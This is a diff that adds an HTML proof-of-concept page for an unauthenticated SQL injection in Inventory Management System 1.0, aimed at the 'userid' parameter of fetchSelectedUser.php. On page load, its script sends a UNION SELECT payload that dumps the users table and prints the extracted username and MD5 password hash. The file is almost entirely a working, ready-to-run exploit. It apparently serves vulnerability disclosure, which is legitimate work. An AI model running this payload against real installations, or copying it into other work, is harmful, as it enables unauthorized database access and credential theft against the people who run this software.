@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>PoC — Inventory Management System 1.0 — Unauth SQLi (fetchSelectedUser.php)</title>
+<style>
+  body{font:14px/1.5 ui-monospace,Menlo,Consolas,monospace;background:#0f1115;color:#e6e6e6;margin:0;padding:28px}
+  h1{font-size:18px;color:#fff;margin:0 0 4px}
+  .sub{color:#8a94a6;margin:0 0 20px}
+  .card{background:#171a21;border:1px solid #262b36;border-radius:8px;padding:16px 18px;margin:14px 0}
+  .k{color:#6ea8fe}
+  .lbl{color:#8a94a6;text-transform:uppercase;font-size:11px;letter-spacing:.08em;margin:0 0 6px}
+  pre{margin:0;white-space:pre-wrap;word-break:break-word}
+  .hit{color:#ff6b6b;font-weight:700}
+  .ok{color:#3fb950}
+  .pill{display:inline-block;background:#2d1a1a;color:#ff8f8f;border:1px solid #5c2b2b;border-radius:999px;padding:2px 10px;font-size:12px}
+</style>
+</head>
+<body>
+  <h1>Unauthenticated SQL Injection — code-projects Inventory Management System 1.0</h1>
+  <p class="sub">Endpoint <span class="k">POST /php_action/fetchSelectedUser.php</span> · parameter <span class="k">userid</span> · <span class="pill">no authentication</span></p>
+
+  <div class="card">
+    <p class="lbl">Request (sent by this page, no session cookie)</p>
+    <pre id="req"></pre>
+  </div>
+
+  <div class="card">
+    <p class="lbl">Server response — users table exfiltrated via UNION</p>
+    <pre id="res">running…</pre>
+  </div>
+
+  <div class="card">
+    <p class="lbl">Extracted credential</p>
+    <pre id="cred">…</pre>
+  </div>
+
+<script>
+const path = "php_action/fetchSelectedUser.php";
+const payload = "userid=0 UNION SELECT user_id,username,password,email FROM users-- -";
+document.getElementById("req").textContent =
+  "POST /" + path + " HTTP/1.1\n" +
+  "Host: " + location.host + "\n" +
+  "Content-Type: application/x-www-form-urlencoded\n" +
+  "Cookie: (none — unauthenticated)\n\n" +
+  payload;
+
+fetch(path, {
+  method: "POST",
+  headers: {"Content-Type": "application/x-www-form-urlencoded"},
+  // credentials omitted on purpose: prove no auth is needed
+  body: payload
+})
+.then(r => r.text())
+.then(t => {
+  document.getElementById("res").textContent = t;
+  try {
+    const j = JSON.parse(t);
+    const user = j.username, hash = j.password;
+    const el = document.getElementById("cred");
+    el.innerHTML = '<span class="ok">username</span> = <span class="hit">' + user +
+      '</span>\n<span class="ok">password (MD5)</span> = <span class="hit">' + hash +
+      '</span>   <span style="color:#8a94a6">// MD5("admin")</span>';
+  } catch(e){ document.getElementById("cred").textContent = "(parse error)"; }
+})
+.catch(e => { document.getElementById("res").textContent = "ERROR: " + e; });
+</script>
+</body>
+</html>
